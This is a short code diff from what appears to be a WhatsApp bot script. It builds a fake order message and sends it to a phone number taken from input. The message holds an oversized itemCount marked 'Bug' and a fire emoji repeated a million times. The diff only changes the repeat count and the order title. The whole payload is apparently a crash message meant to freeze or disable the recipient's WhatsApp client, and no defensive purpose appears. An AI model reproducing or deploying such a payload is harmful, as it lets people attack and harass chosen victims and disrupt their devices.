@@ -11,8 +11,8 @@ conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Ini Apaan?', 
     itemCount: 999999999999999999999999999999999999, // Bug
     status: 1,
     surface: 1,
-    message: '🔥'.repeat(10000000),
-    orderTitle: 'MAMPUS', // Idk what this does
+    message: '🔥'.repeat(1000000),
+    orderTitle: 'ziziz', // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
   }
